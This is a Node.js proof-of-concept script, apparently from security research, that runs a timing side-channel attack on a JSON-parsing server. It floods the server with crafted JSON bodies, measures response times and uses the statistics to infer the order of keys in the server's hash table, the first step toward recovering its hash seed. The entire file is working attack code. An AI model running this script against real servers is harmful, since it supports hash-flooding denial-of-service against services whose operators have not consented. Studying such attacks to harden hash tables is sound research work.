'use strict';

const async = require('async');

const SEED = 1;

const common = require('./common');
const Client = require('./client');
const hash = common.createHash(SEED);
const findPos = common.findPos;

const PORT = (process.argv[2] || 8000) | 0;
const HOST = process.argv[3] || '127.0.0.1';

const REPEAT = 20;
const AMPLIFY = 1024;
const EXTRACT_COUNT = 1024;
const PARALLEL = 1;

const KEY_COUNT = common.KEY_COUNT;
const PROBES_COUNT = KEY_COUNT;

const client = new Client(PORT, HOST);

let offset = (Math.random() * 0xffffffff) >>> 0;
function genKey() {
  return common.genKey(offset++);
}

const keys = [];
for (let i = 0; i < KEY_COUNT; i++)
  keys.push(genKey());
const keyHashes = keys.map(hash).sort((a, b) => a - b);

const spoof = [];
for (let i = 0; i < common.SPOOF_SIZE; i++)
  spoof.push(JSON.stringify(genKey()) + ':0');

const spoofJSON = '[' +
  spoof.map(
    s => '{' + keys.map(k => JSON.stringify(k) + ':0').concat(s).join(',') + '}'
  ).join(',') +
']';

function measure(keys, probes, callback) {
  const pre = [];
  for (let i = 0; i < keys.length; i++)
    pre.push(JSON.stringify(keys[i]) + ':0');

  function repeat(body, callback) {
    let i = 0;
    const timings = [];
    async.whilst(() => {
      return i++ < REPEAT;
    }, (callback) => {
      client.request(body, (err, time) => {
        if (err)
          return callback(err);
        timings.push(time);
        callback(null);
      });
    }, (err) => {
      if (err)
        return callback(err);

      let avg = 0;
      let stddev = 0;
      for (let i = 0; i < timings.length; i++) {
        const time = timings[i];
        avg += time;
        stddev += Math.pow(time, 2);
      }

      avg /= timings.length;
      stddev /= timings.length;
      stddev -= Math.pow(avg, 2);
      stddev = Math.sqrt(stddev);

      callback(null, { avg, stddev });
    })
  }

  client.request(spoofJSON, () => {
    async.mapSeries(probes, (probe, callback) => {
      const list = [];
      for (let i = 0; i < AMPLIFY; i++)
        list.push('{' + pre.join(',') + ',' + JSON.stringify(probe) + ':0}');
      const body = '[' + list.join(',') + ']';

      repeat(body, callback);
    }, callback);
  });
}

console.log('number of tests %d', REPEAT * PROBES_COUNT);
console.log(JSON.stringify(keys));
console.log('[' + keys.map(k => hash(k).toString(16)).join(',') + ']');
console.log('Spoof size: %d', spoofJSON.length);

let results = [];

let iteration = 0;
let hits = 0;
async.whilst(() => {
  return iteration++ < EXTRACT_COUNT;
}, (callback) => {
  const probes = [];
  for (let i = 0; i < PROBES_COUNT; i++)
    probes.push(genKey());

  measure(keys, probes, (err, timings) => {
    let min = Infinity;
    let minI = 0;
    let max = 0;
    let maxI = 0;
    for (let i = 0; i < timings.length; i++) {
      const avg = timings[i].avg;
      const stddev = timings[i].stddev;
      const wstd = Math.exp(-stddev / avg);

      // Totally adhoc way to choose min/max with lowest stddev
      let hscore = avg * wstd;
      let lscore = avg / wstd;

      if (lscore < min) {
        min = lscore;
        minI = i;
      }

      if (hscore > max) {
        max = hscore;
        maxI = i;
      }
    }

    const minHash = hash(probes[minI]);
    const maxHash = hash(probes[maxI]);

    console.log(
      '[%d] l: %s avg=%d pos=%d || r: %s avg=%d pos=%d',
      iteration,
      probes[minI],
      timings[minI].avg.toFixed(1),
      findPos(keyHashes, minHash),
      probes[maxI],
      timings[maxI].avg.toFixed(1),
      findPos(keyHashes, maxHash));

    if (findPos(keyHashes, minHash) > findPos(keyHashes, maxHash))
      hits++;

    results.push(probes[minI], probes[maxI]);

    console.log('Hits %d%%', (100 * (hits * 2) / results.length).toFixed(2));
    console.log(keys.join(':') + '@' + results.join(':'));

    callback(null);
  });
}, () => {
  client.exit();
});
